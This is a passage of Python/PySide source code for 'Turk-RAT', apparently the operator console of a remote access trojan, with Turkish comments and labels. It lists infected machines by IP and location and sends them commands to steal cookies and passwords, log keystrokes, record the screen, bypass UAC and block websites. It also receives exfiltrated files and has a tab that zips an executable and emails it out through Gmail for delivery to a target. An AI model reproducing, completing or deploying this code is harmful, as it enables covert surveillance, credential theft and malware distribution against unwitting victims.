        self.troll_window = TrollWindow(self.conn, self)
        self.troll_window.show()
        self.troll_window.activateWindow()
        logging.info("TrollWindow penceresi açıldı.")

    def start_online_keylogger(self):
        try:
            self.send_command("keylog")
            logging.info("Keylog komutu gönderildi (15s keylogging).")
            script_path = os.path.join(os.getcwd(), "server.py")
            subprocess.Popen(
                ["start", "cmd", "/k", "python", script_path, "--virtual-keyboard", self.addr[0], str(CONTROL_PORT)],
                shell=True)
            logging.info(f"Sanal klavye GUI'si başlatıldı: {self.addr[0]}:{CONTROL_PORT}")
        except Exception as e:
            QMessageBox.critical(self, "Hata", f"Online keylogger başlatılamadı: {e}")
            logging.error(f"Online keylogger başlatma hatası: {e}")

    def update_authority(self, authority):
        self.authority_label.setText(f"Yetki: {authority}")
        logging.info(f"Yetki güncellendi: {authority}")

    def send_command(self, command):
        if not self.conn:
            self.response_text.append("Bağlantı kesildi!")
            self.receive_timer.stop()
            logging.error("Kontrol Paneli: Bağlantı kesildi, timer durduruldu.")
            return
        try:
            self.conn.send(command.encode("utf-8"))
            self.response_text.append(f"Komut gönderildi: {command}")
            self.receive_timer.start(50)
            logging.info(f"Kontrol Paneli: Komut gönderildi: {command}")
        except Exception as e:
            self.response_text.append(f"Hata: {e}")
            self.receive_timer.stop()
            logging.error(f"Kontrol Paneli: Komut gönderirken hata: {e}")

    def check_response(self):
        if not self.conn:
            self.response_text.append("Bağlantı kesildi!")
            self.receive_timer.stop()
            logging.error("Kontrol Paneli: Bağlantı kesildi, timer durduruldu.")
            return
        try:
            self.conn.settimeout(0.1)
            while True:
                data = self.conn.recv(BUFFER_SIZE)
                if not data:
                    break
                if self.is_file_transfer:
                    self.handle_file_data(data)
                else:
                    self.receive_buffer += data
                    if b'\n' in self.receive_buffer:
                        lines = self.receive_buffer.split(b'\n')
                        for line in lines[:-1]:
                            self.process_response(line.decode('utf-8', errors='ignore'))
                        self.receive_buffer = lines[-1]
        except socket.timeout:
            pass
        except Exception as e:
            self.response_text.append(f"Alma hatası: {e}")
            self.receive_timer.stop()
            logging.error(f"Kontrol Paneli: Yanıt alma hatası: {e}")

    def process_response(self, response):
        if response.startswith(FILE_TRANSFER_KEYWORD):
            parts = response[len(FILE_TRANSFER_KEYWORD):].split(':')
            if len(parts) == 2:
                file_name, file_size = parts
                self.expected_file_size = int(file_size)
                self.file_save_path = os.path.join(DOWNLOAD_DIR, file_name)
                self.received_file_size = 0
                self.is_file_transfer = True
                self.response_text.append(f"Dosya alımı başlıyor: {file_name} ({file_size} bayt)")
                logging.info(f"Kontrol Paneli: Dosya alımı başlıyor: {file_name} ({file_size} bayt)")
        else:
            self.response_text.append(response)
            logging.debug(f"Kontrol Paneli: Yanıt alındı: {response}")

    def handle_file_data(self, data):
        try:
            with open(self.file_save_path, 'ab') as f:
                f.write(data)
            self.received_file_size += len(data)
            if self.received_file_size >= self.expected_file_size:
                self.response_text.append(f"Dosya alındı: {self.file_save_path}")
                logging.info(f"Kontrol Paneli: Dosya alındı: {self.file_save_path}")
                self.is_file_transfer = False
                self.expected_file_size = 0
                self.file_save_path = None
        except Exception as e:
            self.response_text.append(f"Dosya yazma hatası: {e}")
            logging.error(f"Kontrol Paneli: Dosya yazma hatası: {e}")
            self.is_file_transfer = False

    def send_block_website(self):
        website, ok = QInputDialog.getText(self, "Block Website", "Engellenecek website URL'sini girin:")
        if ok:
            self.send_command(f"block_website {website}")

    def send_unblock_website(self):
        website, ok = QInputDialog.getText(self, "Unblock Website", "Engeli kaldırılacak website URL'sini girin:")
        if ok:
            self.send_command(f"unblock_website {website}")

    def send_get_cookies(self):
        self.send_command("get_cookies")

    def send_uac_bypass(self):
        self.send_command("uac_bypass")

    def send_grab_passwords(self):
        self.send_command("grab_passwords")

    def send_keylog(self):
        self.send_command("keylog")

    def send_screen_record(self):
        self.send_command("screen_record")

    def send_ss(self):
        self.send_command("ss")

    def send_kapat(self):
        self.send_command("kapat")

    def start_screen_share(self):
        global control_socket, SERVER_IP
        SERVER_IP = self.addr[0]
        control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            control_socket.connect((SERVER_IP, CONTROL_PORT))
            logging.info(f"[Kontrol İstemci] Kontrol bağlantısı kuruldu: {SERVER_IP}:{CONTROL_PORT}")
        except ConnectionRefusedError:
            logging.error(f"HATA: Sunucu ({SERVER_IP}:{CONTROL_PORT}) kontrol bağlantısını reddetti.")
            control_socket = None
        video_thread = threading.Thread(target=start_video_receiver)
        video_thread.start()


class DeviceCard(QWidget):
    clicked = Signal(str)

    def __init__(self, addr_str, system_info, conn, parent=None):
        super().__init__(parent)
        self.addr_str = addr_str
        self.system_info = system_info
        self.conn = conn
        layout = QVBoxLayout(self)
        layout.setContentsMargins(10, 10, 10, 10)

        info_frame = QFrame()
        info_frame.setStyleSheet("background-color: #1a1a1a; border: 1px solid #f70202;")
        info_layout = QHBoxLayout(info_frame)
        info_layout.setAlignment(Qt.AlignLeft | Qt.AlignVCenter)

        os_name = system_info.get("os", "Bilinmiyor").lower()
        os_image_path = os.path.join(OS_IMAGE_DIR, f"{os_name}.png")
        os_image_label = QLabel()
        if os.path.exists(os_image_path):
            os_image = QPixmap(os_image_path).scaled(100, 100, Qt.KeepAspectRatio, Qt.SmoothTransformation)
            os_image_label.setPixmap(os_image)
        else:
            os_image_label.setText(os_name.capitalize())
            os_image_label.setStyleSheet("color: #f70202; font-size: 14px;")
        os_image_label.setFixedSize(100, 100)
        info_layout.addWidget(os_image_label)

        ip_label = QLabel(f"IP: {addr_str}")
        ip_label.setStyleSheet("color: #f70202; font-size: 14px;")
        ip_label.setFixedWidth(250)
        info_layout.addWidget(ip_label)

        country = system_info.get("country", "Bilinmiyor")
        country_label = QLabel(f"Konum: {country}")
        country_label.setStyleSheet("color: #f70202; font-size: 14px;")
        country_label.setFixedWidth(200)
        info_layout.addWidget(country_label)

        region_label = QLabel(f"Bölge: {country}")
        region_label.setStyleSheet("color: #f70202; font-size: 14px;")
        region_label.setFixedWidth(200)
        info_layout.addWidget(region_label)

        self.status_label = QLabel()
        self.update_status(True)
        self.status_label.setStyleSheet("color: #00ff00; font-size: 14px;")
        self.status_label.setFixedWidth(200)
        info_layout.addWidget(self.status_label)

        cpu = system_info.get("cpu", "Bilinmiyor")
        cpu_label = QLabel(f"CPU: {cpu}")
        cpu_label.setStyleSheet("color: #f70202; font-size: 14px;")
        cpu_label.setFixedWidth(250)
        info_layout.addWidget(cpu_label)

        ram = system_info.get("ram", "Bilinmiyor")
        ram_label = QLabel(f"RAM: {ram}")
        ram_label.setStyleSheet("color: #f70202; font-size: 14px;")
        ram_label.setFixedWidth(200)
        info_layout.addWidget(ram_label)

        disk = system_info.get("disk", "Bilinmiyor")
        disk_label = QLabel(f"Disk: {disk}")
        disk_label.setStyleSheet("color: #f70202; font-size: 14px;")
        disk_label.setFixedWidth(200)
        info_layout.addWidget(disk_label)

        flag_image_label = QLabel()
        if country == "Turkey":
            flag_path = os.path.join(FLAG_IMAGE_DIR, "turkish.png")
            if os.path.exists(flag_path):
                flag_image = QPixmap(flag_path).scaled(75, 75, Qt.KeepAspectRatio, Qt.SmoothTransformation)
                flag_image_label.setPixmap(flag_image)
            else:
                flag_image_label.setText("Bayrak Bulunamadı")
                flag_image_label.setStyleSheet("color: #f70202; font-size: 14px;")
        else:
            flag_image_label.setText("Bayrak Yok")
            flag_image_label.setStyleSheet("color: #f70202; font-size: 14px;")
        flag_image_label.setFixedSize(75, 75)
        info_layout.addWidget(flag_image_label)

        layout.addWidget(info_frame)
        layout.addStretch()
        logging.info(f"DeviceCard oluşturuldu: {addr_str}")

    def update_status(self, is_active):
        if is_active:
            self.status_label.setText("Durum: Açık")
            self.status_label.setStyleSheet("color: #00ff00; font-size: 14px;")
        else:
            self.status_label.setText("Durum: Kapalı")
            self.status_label.setStyleSheet("color: #ff0000; font-size: 14px;")
        logging.debug(f"DeviceCard durum güncellendi: {self.addr_str} - {'Açık' if is_active else 'Kapalı'}")

    def mouseDoubleClickEvent(self, event):
        self.clicked.emit(self.addr_str)
        logging.info(f"Çift tıklama algılandı: {self.addr_str}")


class ZipTab(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setStyleSheet("background-color: #000000;")
        layout = QVBoxLayout(self)

        select_btn = QPushButton("Exe Dosyası Seç")
        select_btn.clicked.connect(self.select_exe)
        select_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        layout.addWidget(select_btn)

        self.sender_email = QLineEdit()
        self.sender_email.setPlaceholderText("Gönderen Gmail Hesabı")
        self.sender_email.setStyleSheet("""
            QLineEdit { color: #f70202; background-color: #000000; border: 2px solid #f70202; padding: 10px; font-size: 16px; }
        """)
        layout.addWidget(self.sender_email)

        self.sender_password = QLineEdit()
        self.sender_password.setPlaceholderText("Gönderen Gmail Şifresi (App Password)")
        self.sender_password.setEchoMode(QLineEdit.Password)
        self.sender_password.setStyleSheet("""
            QLineEdit { color: #f70202; background-color: #000000; border: 2px solid #f70202; padding: 10px; font-size: 16px; }
        """)
        layout.addWidget(self.sender_password)

        self.receiver_email = QLineEdit()
        self.receiver_email.setPlaceholderText("Gönderilecek Gmail Hesabı")
        self.receiver_email.setStyleSheet("""
            QLineEdit { color: #f70202; background-color: #000000; border: 2px solid #f70202; padding: 10px; font-size: 16px; }
        """)
        layout.addWidget(self.receiver_email)

        zip_send_btn = QPushButton("Zip'le ve Gönder")
        zip_send_btn.clicked.connect(self.zip_and_send)
        zip_send_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        layout.addWidget(zip_send_btn)

        self.status_label = QLabel("")
        self.status_label.setStyleSheet("color: #f70202; font-size: 14px;")
        layout.addWidget(self.status_label)

        layout.addStretch()
        self.exe_path = None
        logging.info("ZipTab başlatıldı.")

    def select_exe(self):
        self.exe_path, _ = QFileDialog.getOpenFileName(self, "Exe Dosyası Seç", "", "Executable Files (*.exe)")
        if self.exe_path:
            self.status_label.setText(f"Seçilen Exe: {os.path.basename(self.exe_path)}")
            logging.info(f"Exe dosyası seçildi: {self.exe_path}")

    def zip_and_send(self):
        if not self.exe_path:
            QMessageBox.warning(self, "Hata", "Önce exe dosyası seç!")
            logging.warning("Zip ve gönder: Exe dosyası seçilmedi.")
            return

        sender = self.sender_email.text()
        password = self.sender_password.text()
        receiver = self.receiver_email.text()

        if not sender or not password or not receiver:
            QMessageBox.warning(self, "Hata", "Tüm alanları doldur!")
            logging.warning("Zip ve gönder: Tüm alanlar doldurulmadı.")
            return

        zip_path = self.exe_path + ".zip"
        try:
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                zipf.write(self.exe_path, os.path.basename(self.exe_path))
            self.status_label.setText("Zip Oluşturuldu!")
            logging.info(f"Zip oluşturuldu: {zip_path}")

            msg = MIMEMultipart()
            msg['From'] = sender
            msg['To'] = receiver
            msg['Subject'] = "Zip'lenmiş Exe Dosyası"

            with open(zip_path, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f"attachment; filename= {os.path.basename(zip_path)}")
                msg.attach(part)

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(sender, password)
            server.sendmail(sender, receiver, msg.as_string())
            server.quit()

            self.status_label.setText("Zip Gönderildi!")
            os.remove(zip_path)
            logging.info("Zip gönderildi ve silindi.")
        except Exception as e:
            QMessageBox.critical(self, "Hata", f"İşlem hatası: {e}")
            logging.error(f"Zip ve gönder hatası: {e}")


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Turk-RAT Builder")
        self.setGeometry(0, 0, 1920, 1080)
        self.setStyleSheet("background-color: #000000;")

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        logo_layout = QHBoxLayout()
        logo_path = os.path.join(IMAGE_DIR, "akrep.png")
        logo_label = QLabel(self)
        if os.path.exists(logo_path):
            logo = QPixmap(logo_path).scaled(175, 175, Qt.KeepAspectRatio, Qt.SmoothTransformation)
            logo_label.setPixmap(logo)
            logo_label.setFixedSize(175, 175)
        else:
            logo_label.setText("Logo bulunamadı (akrep.png)")
            logo_label.setStyleSheet("color: #f70202; font-size: 16px;")
            logo_label.setFixedSize(175, 175)
        logo_layout.addWidget(logo_label)

        welcome_label = QLabel("Welcome to Turk-RAT")
        welcome_label.setStyleSheet("color: #f70202; font-size: 24px; font-weight: bold;")
        welcome_label.setFixedHeight(175)
        welcome_label.setAlignment(Qt.AlignLeft | Qt.AlignVCenter)
        logo_layout.addWidget(welcome_label)
        logo_layout.addStretch()

        layout.addLayout(logo_layout)

        tabs = QTabWidget()
        tabs.setStyleSheet("""
            QTabWidget::pane { 
                border: 1px solid #f70202; 
                background-color: #000000;
            }
            QTabBar::tab { 
                color: #f70202; 
                border: 1px solid #f70202; 
                padding: 10px; 
                background-color: #000000; 
            }
            QTabBar::tab:selected { 
                background-color: #1a1a1a; 
                color: #f70202; 
            }
        """)
        layout.addWidget(tabs)

        home_tab = QWidget()
        home_layout = QVBoxLayout(home_tab)
        maps_path = os.path.join(IMAGE_DIR, "maps.png")
        maps_label = QLabel(self)
        if os.path.exists(maps_path):
            maps = QPixmap(maps_path).scaled(1920, 905, Qt.KeepAspectRatio, Qt.SmoothTransformation)
            maps_label.setPixmap(maps)
            maps_label.setScaledContents(True)
            maps_label.setMinimumSize(1920, 905)
        else:
            maps_label.setText("maps.png bulunamadı")
            maps_label.setStyleSheet("color: #f70202; font-size: 16px;")
            maps_label.setMinimumSize(1920, 905)
        home_layout.addWidget(maps_label)
        self.client_count_label = QLabel("Aktif Client: 0")
        self.client_count_label.setStyleSheet("color: #f70202; font-size: 14px;")
        home_layout.addWidget(self.client_count_label)
        home_layout.addStretch()
        tabs.addTab(home_tab, "Home")

        server_tab = QWidget()
        self.server_layout = QVBoxLayout(server_tab)
        self.server_layout.setSpacing(3)
        self.server_layout.setContentsMargins(5, 0, 5, 10)
        tabs.addTab(server_tab, "Server")

        zip_tab = ZipTab()
        tabs.addTab(zip_tab, "ZIP")

        login_tab = QWidget()
        login_layout = QVBoxLayout(login_tab)
        self.builder = BuilderWindow()
        login_layout.addWidget(self.builder)
        tabs.addTab(login_tab, "login")

        self.server_thread = ServerThread()
        self.server_thread.client_connected.connect(self.add_client_card)
        self.server_thread.initial_message.connect(self.show_initial_message)
        self.server_thread.authority_message.connect(self.update_client_authority)
        self.server_thread.client_disconnected.connect(self.update_client_status)
        self.server_thread.start()

        self.clients = {}
        self.control_panels = {}
        self.device_cards = {}

        self.update_timer = QTimer(self)
        self.update_timer.timeout.connect(self.update_client_count)
        self.update_timer.start(5000)
        logging.info("MainWindow başlatıldı.")

    def add_client_card(self, addr_str, system_info):
        addr = (addr_str.split(':')[0], int(addr_str.split(':')[1]))
        conn = self.server_thread.clients.get(addr)
        if conn:
            self.clients[addr] = conn
            card = DeviceCard(addr_str, system_info, conn, self)
            card.clicked.connect(self.open_control_panel)
            self.device_cards[addr_str] = card
            self.server_layout.addWidget(card)
            self.update_client_count()
            logging.info(f"İstemci kartı eklendi: {addr_str}")
        else:
            logging.error(f"İstemci bağlantısı bulunamadı: {addr_str}")

    def update_client_status(self, addr_str):
        card = self.device_cards.get(addr_str)
        if card:
            card.update_status(False)
            logging.info(f"İstemci durumu güncellendi: {addr_str} - Kapalı")
        if addr_str in self.clients:
            del self.clients[addr_str]
            logging.info(f"İstemci kaldırıldı: {addr_str}")

    def show_initial_message(self, message):
        logging.info(f"İlk mesaj: {message}")

    def update_client_authority(self, addr_str, authority):
        logging.info(f"{addr_str} yetki: {authority}")
        panel = self.control_panels.get(addr_str)
        if panel:
            panel.update_authority(authority)

    def update_client_count(self):
        active_clients = len(self.clients)
        self.client_count_label.setText(f"Aktif Client: {active_clients}")
        logging.debug(f"Aktif istemci sayısı: {active_clients}")

    def open_control_panel(self, addr_str):
        logging.info(f"Kontrol paneli açılmaya çalışılıyor: {addr_str}")
        addr = (addr_str.split(':')[0], int(addr_str.split(':')[1]))
        conn = self.clients.get(addr)
        if conn:
            try:
                conn.settimeout(10.0)
                conn.send(PING_KEYWORD.encode("utf-8"))
                test_data = conn.recv(BUFFER_SIZE).decode("utf-8", errors="ignore")
                if test_data.strip() == "PONG":
                    logging.debug(f"Bağlantı testi başarılı: {addr_str}")
                else:
                    raise Exception(f"Ping yanıtı beklenmeyen veri: {test_data}")

                if addr_str in self.control_panels:
                    logging.info(f"Mevcut kontrol paneli gösteriliyor: {addr_str}")
                    self.control_panels[addr_str].show()
                    self.control_panels[addr_str].raise_()
                    self.control_panels[addr_str].activateWindow()
                else:
                    logging.info(f"Yeni kontrol paneli oluşturuluyor: {addr_str}")
                    panel = ControlPanel(conn, addr, self)
                    panel.show()
                    panel.raise_()
                    panel.activateWindow()
                    self.control_panels[addr_str] = panel
                    panel.send_command("get_authority")
                    logging.info(f"Kontrol paneli oluşturuldu ve gösterildi: {addr_str}")
            except socket.timeout:
                logging.error(f"Bağlantı testi zaman aşımı: {addr_str}")
                QMessageBox.critical(self, "Hata", f"Bağlantı zaman aşımı: {addr_str}")
                self.clients.pop(addr, None)
                self.device_cards[addr_str].update_status(False)
            except Exception as e:
                logging.error(f"Bağlantı testi veya panel açma hatası: {addr_str} - {e}")
                QMessageBox.critical(self, "Hata", f"Bağlantı kontrolü başarısız: {e}")
                self.clients.pop(addr, None)
                self.device_cards[addr_str].update_status(False)
        else:
            logging.error(f"Bağlantı bulunamadı: {addr_str}")
            QMessageBox.critical(self, "Hata", "Bağlantı bulunamadı!")


class LoginWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Turk-RAT Giriş")
        self.setGeometry(0, 0, 600, 800)
        self.setStyleSheet("background-color: #000000;")

        main_layout = QHBoxLayout(self)

        logo_path = os.path.join(IMAGE_DIR, "akrep.png")
        logo_label = QLabel(self)
        if os.path.exists(logo_path):
            logo = QPixmap(logo_path).scaled(300, 800, Qt.KeepAspectRatio, Qt.SmoothTransformation)
            logo_label.setPixmap(logo)
            logo_label.setFixedSize(300, 800)
        else:
            logo_label.setText("Logo bulunamadı (akrep.png)")
            logo_label.setStyleSheet("color: #f70202; font-size: 16px;")
            logo_label.setFixedSize(300, 800)
            logo_label.setAlignment(Qt.AlignCenter)
        main_layout.addWidget(logo_label)

        right_layout = QVBoxLayout()
        right_layout.setAlignment(Qt.AlignCenter)

        welcome_label = QLabel("Welcome to Turk-RAT")
        welcome_label.setStyleSheet("color: #f70202; font-size: 24px; font-weight: bold;")
        welcome_label.setAlignment(Qt.AlignCenter)
        right_layout.addWidget(welcome_label)

        self.input1 = QLineEdit()
        self.input1.setPlaceholderText("12")
        self.input1.setStyleSheet("""
            QLineEdit {
                color: #f70202;
                background-color: #000000;
                border: 2px solid #f70202;
                padding: 10px;
                font-size: 16px;
            }
        """)
        self.input1.setFixedSize(250, 50)
        right_layout.addWidget(self.input1)

        self.input2 = QLineEdit()
        self.input2.setPlaceholderText("12")
        self.input2.setStyleSheet("""
            QLineEdit {
                color: #f70202;
                background-color: #000000;
                border: 2px solid #f70202;
                padding: 10px;
                font-size: 16px;
            }
        """)
        self.input2.setFixedSize(250, 50)
        right_layout.addWidget(self.input2)

        login_button = QPushButton("Giriş")
        login_button.clicked.connect(self.check_credentials)
        login_button.setStyleSheet("""
            QPushButton {
                color: #f70202;
                border: 2px solid #f70202;
                padding: 10px;
                font-size: 16px;
                background-color: #000000;
            }
            QPushButton:hover {
                background-color: #1a1a1a;
            }
        """)
        login_button.setFixedSize(250, 50)
        right_layout.addWidget(login_button)

        right_layout.addStretch()
        main_layout.addLayout(right_layout)
        self.setLayout(main_layout)
        logging.info("LoginWindow başlatıldı.")

    def check_credentials(self):
        if self.input1.text() == "12" and self.input2.text() == "12":
            self.main_window = MainWindow()
            self.main_window.show()
            self.close()
            logging.info("Giriş başarılı, MainWindow açıldı.")
        else:
            QMessageBox.critical(self, "Hata", "Geçersiz giriş! Her iki kutuya da '12' yazılmalı.")
            logging.warning("Giriş başarısız: Geçersiz kimlik bilgileri.")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    try:
        login_window = LoginWindow()
        login_window.show()
        sys.exit(app.exec())
    except Exception as e:
        logging.error(f"GUI başlatma hatası: {e}")